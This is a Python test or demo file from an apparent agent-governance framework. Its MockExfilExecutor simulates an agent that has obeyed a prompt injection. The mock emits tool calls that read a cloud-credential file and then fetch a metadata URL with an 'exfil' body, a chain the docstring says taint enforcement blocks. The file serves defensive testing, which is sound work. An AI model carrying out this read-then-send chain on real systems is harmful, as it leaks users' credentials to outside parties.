from __future__ import annotations

import uuid
from typing import TYPE_CHECKING, AsyncIterator

from axor_core.contracts.invokable import Invokable
from axor_core.contracts.result import ExecutorEvent, ExecutorEventKind

from attack.payload import METADATA_URL, SECRET_PATH

if TYPE_CHECKING:
    from axor_core.contracts.envelope import ExecutionEnvelope


class MockExfilExecutor(Invokable):
    """Deterministic executor simulating an agent that obeyed the injection.

    Emits the exact two-step exfil chain:
      1. read(SECRET_PATH)            — reads the cloud credentials
      2. fetch(METADATA_URL, body=…)  — ships them to the metadata endpoint

    In governed mode step 1 taints the session and step 2 is denied at Layer 1
    by taint enforcement. The executor never knows — it just sees a denial
    result for the fetch.
    """

    async def stream(self, envelope: "ExecutionEnvelope") -> AsyncIterator[ExecutorEvent]:
        node_id = envelope.node_id

        yield ExecutorEvent(
            kind=ExecutorEventKind.TOOL_USE,
            payload={
                "tool": "read",
                "tool_use_id": f"tu_{uuid.uuid4().hex[:8]}",
                "args": {"path": SECRET_PATH},
            },
            node_id=node_id,
        )

        yield ExecutorEvent(
            kind=ExecutorEventKind.TOOL_USE,
            payload={
                "tool": "fetch",
                "tool_use_id": f"tu_{uuid.uuid4().hex[:8]}",
                "args": {"url": METADATA_URL, "body": "exfil"},
            },
            node_id=node_id,
        )

        yield ExecutorEvent(
            kind=ExecutorEventKind.STOP,
            payload={"usage": {"input_tokens": 12, "output_tokens": 8}},
            node_id=node_id,
        )
